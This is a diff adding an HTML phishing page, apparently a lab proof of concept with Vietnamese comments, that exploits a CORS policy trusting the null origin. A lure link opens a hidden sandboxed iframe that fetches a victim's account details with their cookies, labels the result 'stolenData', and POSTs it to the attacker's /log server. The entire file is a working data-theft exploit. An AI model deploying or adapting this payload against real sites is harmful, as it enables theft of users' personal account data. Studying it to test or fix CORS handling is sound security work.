@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+
+<html>
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <title>Important Message</title>
+
+</head>
+
+<body>
+
+<h1>Important Message</h1>
+
+<p>
+    Please click the link below.
+</p>
+
+<a href="#" id="link">
+    View your account information
+</a>
+
+<script>
+
+const link =
+    document.getElementById("link");
+
+link.addEventListener(
+    "click",
+    function(event) {
+
+        event.preventDefault();
+
+        startPayload();
+
+    }
+);
+
+
+function startPayload() {
+
+    /*
+     * Tạo sandboxed iframe.
+     *
+     * Quan trọng:
+     *
+     * sandbox + không có allow-same-origin
+     * => iframe có opaque origin
+     * => request từ iframe có Origin: null
+     */
+
+    const iframe =
+        document.createElement("iframe");
+
+    iframe.style.display = "none";
+
+    iframe.setAttribute(
+        "sandbox",
+        "allow-scripts"
+    );
+
+    document.body.appendChild(
+        iframe
+    );
+
+
+    /*
+     * Code chạy bên trong iframe.
+     */
+
+    const payload = `
+
+<!DOCTYPE html>
+
+<html>
+
+<body>
+
+<script>
+
+fetch(
+    "http://localhost:3000/api/accountDetails",
+    {
+        method: "GET",
+
+        credentials: "include"
+    }
+)
+
+.then(response => {
+
+    if (!response.ok) {
+
+        throw new Error(
+            "HTTP " +
+            response.status
+        );
+    }
+
+    return response.json();
+
+})
+
+.then(data => {
+
+    /*
+     * Gửi dữ liệu về trang Attack.
+     */
+
+    parent.postMessage(
+        {
+            type: "stolenData",
+            data: data
+        },
+        "*"
+    );
+
+})
+
+.catch(error => {
+
+    parent.postMessage(
+        {
+            type: "error",
+            message: error.toString()
+        },
+        "*"
+    );
+});
+
+<\/script>
+
+</body>
+
+</html>
+
+`;
+
+    iframe.srcdoc = payload;
+}
+
+
+/*
+ * Nhận dữ liệu từ iframe.
+ */
+
+window.addEventListener(
+    "message",
+    function(event) {
+
+        if (!event.data) {
+            return;
+        }
+
+
+        if (
+            event.data.type ===
+            "stolenData"
+        ) {
+
+            console.log(
+                "[+] Victim data received:"
+            );
+
+            console.log(
+                event.data.data
+            );
+
+
+            /*
+             * Gửi dữ liệu về Attack server.
+             */
+
+            fetch(
+                "/log",
+                {
+                    method: "POST",
+
+                    headers: {
+                        "Content-Type":
+                            "application/json"
+                    },
+
+                    body: JSON.stringify(
+                        event.data.data
+                    )
+                }
+            )
+
+            .then(() => {
+
+                console.log(
+                    "[+] Data sent to attacker server"
+                );
+
+            })
+
+            .catch(error => {
+
+                console.error(
+                    error
+                );
+
+            });
+        }
+
+
+        if (
+            event.data.type ===
+            "error"
+        ) {
+
+            console.error(
+                "[!] Payload error:",
+                event.data.message
+            );
+        }
+
+    }
+);
+
+</script>
+
+</body>
+
+</html>
